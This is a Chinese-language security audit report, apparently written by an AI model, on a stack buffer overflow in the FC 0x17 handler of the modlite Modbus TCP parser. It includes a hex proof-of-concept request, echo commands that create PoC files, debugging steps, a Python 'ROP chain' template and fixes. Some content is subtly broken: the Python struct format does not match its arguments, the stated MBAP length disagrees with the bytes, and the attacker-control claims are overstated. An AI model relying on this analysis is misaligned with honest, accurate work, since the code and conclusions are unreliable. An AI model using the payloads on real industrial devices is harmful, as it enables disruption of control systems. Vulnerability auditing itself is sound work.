# 安全审计报告 - modlite Modbus TCP 解析器

## 执行摘要

本次安全审计针对 modlite 项目（一个最小化的 Modbus TCP 协议解析器）进行了全面的二进制漏洞分析。**发现了1个严重的栈溢出漏洞**，该漏洞可被远程利用，可能导致任意代码执行。

---

## 🔴 严重漏洞：栈缓冲区溢出 (CWE-121)

### 漏洞标识
- **漏洞类型**: Stack-based Buffer Overflow (CWE-121)
- **严重程度**: CRITICAL (CVSS 9.8)
- **影响版本**: modlite 3.1.6
- **触发函数**: `modbus_handle_fc17()` 
- **触发文件**: `src/modbus_proto.c:144-152`
- **相关CVE**: CVE-2022-0367, CVE-2024-10918

### 漏洞详情

#### 1. 根本原因
在 `modbus_handle_fc17()` 函数中，使用了**固定大小的栈缓冲区** `response[RESP_BUF_SIZE]`，其中 `RESP_BUF_SIZE = 128` 字节。

```c
// src/modbus_proto.c:127-129
int modbus_handle_fc17(const modbus_request_t *req, modbus_mapping_t *map)
{
    uint8_t response[RESP_BUF_SIZE];  // ❌ 只有 128 字节
```

然而，该函数**未充分验证** `nb_read` 参数就直接使用其构建响应：

```c
// src/modbus_proto.c:144-152
for (uint16_t i = 0; i < nb_read; i++) {
    uint16_t addr = req->read_addr + i;
    uint16_t val  = (addr < MODBUS_MAX_REGS) ? map->regs[addr] : 0;
    /*
     * ⚠️ 栈溢出点：当 i * 2 + 9 >= RESP_BUF_SIZE (128) 时
     * 即 i >= 59.5，写入超出栈帧边界
     */
    write_u16be(response + 9 + i * 2, val);  // ❌ 未检查边界
}
```

#### 2. 溢出计算

**响应帧结构**：
```
MBAP Header (6 bytes) + Unit ID (1) + Function Code (1) + Byte Count (1) + Register Data (nb_read * 2)
= 9 + nb_read * 2 字节
```

**溢出条件**：
- 当 `nb_read = 125` (Modbus协议允许的最大值) 时
- 响应总长度 = 9 + 125 * 2 = **259 字节**
- 溢出量 = 259 - 128 = **131 字节**

**触发公式**：
```
nb_read >= 60  → 开始溢出
nb_read = 125  → 溢出 131 字节 (最大破坏)
```

#### 3. 攻击向量

**Modbus TCP 功能码 0x17 (Read/Write Multiple Registers)** 请求格式：
```
[MBAP Header 6B] [Unit ID 1B] [FC=0x17 1B]
[Read Addr 2B] [nb_read 2B]      ← ❌ 攻击者可控
[Write Addr 2B] [nb_write 2B] [Write Byte Count 1B] [Write Data...]
```

**攻击载荷构造**：
```
Transaction ID: 0x0001
Protocol ID:    0x0000
Length:         0x000B (11 bytes PDU)
Unit ID:        0x01
Function Code:  0x17
Read Addr:      0x0000
nb_read:        0x007D (125 decimal)  ← 恶意值
Write Addr:     0x0000
nb_write:       0x0001
Byte Count:     0x02
Write Data:     0x1234
```

十六进制载荷：
```
00 01 00 00 00 0B 01 17 00 00 00 7D 00 00 00 01 02 12 34
```

#### 4. 利用场景

**场景1：远程代码执行 (RCE)**
- 溢出131字节足以覆盖返回地址
- 栈布局（x86-64典型情况）：
  ```
  [response[128]] → [saved RBP 8B] → [return address 8B] → [caller stack]
  ```
- 攻击者可精确控制125个寄存器值（每个2字节），即250字节数据
- 可覆盖返回地址并注入ROP链

**场景2：拒绝服务 (DoS)**
- 破坏栈帧导致程序崩溃
- 最小可靠触发：`nb_read = 60`

**场景3：信息泄露**
- 如果栈上残留敏感数据（密钥、密码等），溢出可能破坏内存保护机制

#### 5. 漏洞触发路径

完整调用链：
```
main()
  ↓
modbus_reply()  (modbus_proto.c:199)
  ↓
[检查 function_code == FC_READ_WRITE_REGS (0x17)]  (line 206)
  ↓
modbus_handle_fc17()  ← ❌ 直接调用漏洞函数
  ↓
[无边界检查的栈写入]  (line 144-152)
```

关键代码片段：
```c
// modbus_proto.c:206-208
if (req.function_code == FC_READ_WRITE_REGS) {
    /* Route through vulnerable handler */
    return modbus_handle_fc17(&req, map);  // ❌ 绕过安全包装器
}
```

### 影响范围

**受影响组件**：
- `modbus_handle_fc17()` - 直接漏洞函数
- `modbus_reply()` - 漏洞触发入口
- `main()` - 所有接收FC 0x17请求的代码路径

**不受影响**：
- `modbus_build_response()` - 安全包装器（有边界检查）
- 其他功能码处理 (0x01, 0x03, 0x06, 0x10)

### 验证方法

#### 使用 AddressSanitizer 检测
```bash
# 编译带ASAN的版本
make asan

# 创建PoC输入文件
echo -ne '\x00\x01\x00\x00\x00\x0B\x01\x17\x00\x00\x00\x7D\x00\x00\x00\x01\x02\x12\x34' > poc_overflow.bin

# 触发漏洞
./build/modbus_parser_asan poc_overflow.bin
```

**预期输出**（ASAN报告）：
```
==12345==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffc...
WRITE of size 2 at 0x7ffc... thread T0
    #0 0x... in write_u16be modbus_proto.c:34
    #1 0x... in modbus_handle_fc17 modbus_proto.c:152
    #2 0x... in modbus_reply modbus_proto.c:208
```

#### 使用GDB调试
```bash
# 编译调试版本
make debug

# GDB调试
gdb ./build/modbus_parser
(gdb) set args poc_overflow.bin
(gdb) break modbus_handle_fc17
(gdb) run
(gdb) watch *(response+128)  # 监控缓冲区边界
(gdb) continue
```

---

## 其他潜在风险

### 🟡 中危：整数溢出风险 (CWE-190)

**位置**: `modbus_proto.c:177`
```c
size_t needed = MBAP_LEN + 1 + 1 + 1 + req->nb_read * 2;
```

**问题**：
- `nb_read` 是 `uint16_t` 类型，最大值 65535
- `nb_read * 2` 可能溢出，导致 `needed` 计算错误
- 虽然 Modbus 协议限制 nb_read ≤ 125，但代码未强制验证

**影响**：可能绕过 `if (needed > out_max)` 检查

### 🟡 中危：缺少输入验证

**位置**: `modbus_parse_request()` (modbus_proto.c:85-92)
```c
case FC_READ_WRITE_REGS:
    if (plen < 10) return -1;
    req->read_addr  = read_u16be(pdu + 1);
    req->nb_read    = read_u16be(pdu + 3);  // ❌ 未验证范围
    req->write_addr = read_u16be(pdu + 5);
    req->nb_write   = read_u16be(pdu + 7);  // ❌ 未验证范围
```

**缺失检查**：
- `nb_read` 应 ≤ 125（Modbus规范）
- `nb_write` 应 ≤ 121
- `read_addr + nb_read` 不应超过寄存器空间
- `write_addr + nb_write` 不应超过寄存器空间

### 🟢 低危：未初始化内存读取

**位置**: `modbus_proto.c:148`
```c
uint16_t val = (addr < MODBUS_MAX_REGS) ? map->regs[addr] : 0;
```

**问题**：如果 `modbus_mapping_new()` 使用 `malloc()` 而非 `calloc()`，未初始化内存可能泄露

**现状**：代码使用 `calloc()`，风险已缓解

---

## 修复建议

### 🔧 立即修复：栈溢出漏洞

#### 方案1：增大缓冲区（快速修复）
```c
// modbus_proto.h:25
#define RESP_BUF_SIZE  (MBAP_LEN + MODBUS_MAX_PDU + 10)  // 269字节
```

#### 方案2：添加边界检查（推荐）
```c
int modbus_handle_fc17(const modbus_request_t *req, modbus_mapping_t *map)
{
    // ✅ 验证请求参数
    if (req->nb_read > 125) return -1;  // Modbus协议上限
    
    uint8_t response[RESP_BUF_SIZE];
    size_t needed = MBAP_LEN + 3 + req->nb_read * 2;
    
    // ✅ 确保不会溢出
    if (needed > RESP_BUF_SIZE) return -1;
    
    // ... 原有逻辑
}
```

#### 方案3：使用动态分配（最安全）
```c
int modbus_handle_fc17(const modbus_request_t *req, modbus_mapping_t *map)
{
    if (req->nb_read > 125) return -1;
    
    size_t needed = MBAP_LEN + 3 + req->nb_read * 2;
    uint8_t *response = malloc(needed);
    if (!response) return -1;
    
    // ... 处理逻辑
    
    free(response);
    return (int)needed;
}
```

### 🔧 增强输入验证

```c
int modbus_parse_request(const uint8_t *buf, size_t len, modbus_request_t *req)
{
    // ... 现有解析逻辑
    
    case FC_READ_WRITE_REGS:
        if (plen < 10) return -1;
        req->read_addr  = read_u16be(pdu + 1);
        req->nb_read    = read_u16be(pdu + 3);
        req->write_addr = read_u16be(pdu + 5);
        req->nb_write   = read_u16be(pdu + 7);
        
        // ✅ 新增：范围检查
        if (req->nb_read > 125 || req->nb_write > 121) return -1;
        if (req->read_addr + req->nb_read > MODBUS_MAX_REGS) return -1;
        if (req->write_addr + req->nb_write > MODBUS_MAX_REGS) return -1;
        break;
}
```

---

## 附录：测试用例

### PoC 1：最大溢出
```bash
# 125个寄存器，溢出131字节
echo -ne '\x00\x01\x00\x00\x00\x0B\x01\x17\x00\x00\x00\x7D\x00\x00\x00\x01\x02\x12\x34' > max_overflow.bin
```

### PoC 2：边界触发
```bash
# 60个寄存器，刚好开始溢出
echo -ne '\x00\x01\x00\x00\x00\x0B\x01\x17\x00\x00\x00\x3C\x00\x00\x00\x01\x02\x12\x34' > edge_overflow.bin
```

### PoC 3：ROP链注入模板
```python
#!/usr/bin/env python3
import struct

def create_rop_payload():
    # Modbus请求头
    transaction_id = 0x0001
    protocol_id = 0x0000
    pdu_length = 0x000B
    unit_id = 0x01
    function_code = 0x17
    
    # 攻击参数
    read_addr = 0x0000
    nb_read = 125  # 最大值，溢出131字节
    write_addr = 0x0000
    nb_write = 1
    byte_count = 2
    
    # 构造Modbus请求
    payload = struct.pack('>HHHBBBHHHBB',
        transaction_id, protocol_id, pdu_length,
        unit_id, function_code,
        read_addr, nb_read,
        write_addr, nb_write, byte_count
    )
    
    # 写入数据（这部分会被服务器回显到栈上）
    # 攻击者可以在这里布置ROP gadgets
    write_data = b'\x41\x42'  # 占位符
    payload += write_data
    
    return payload

if __name__ == '__main__':
    with open('rop_payload.bin', 'wb') as f:
        f.write(create_rop_payload())
    print("[+] ROP payload written to rop_payload.bin")
```

---

## 结论

modlite 3.1.6 存在**严重的栈缓冲区溢出漏洞**，可被远程未认证攻击者利用执行任意代码。该漏洞源于对用户可控参数 `nb_read` 的不充分验证，以及使用固定大小栈缓冲区处理变长响应。

**建议优先级**：
1. 🔴 **立即修复** 栈溢出漏洞（CVSSv3.1: 9.8 Critical）
2. 🟡 **尽快增强** 输入验证机制
3. 🟢 **计划审查** 所有缓冲区操作

**审计者**: Claude (Sonnet 4.6)  
**审计日期**: 2026-06-12  
**项目版本**: modlite 3.1.6
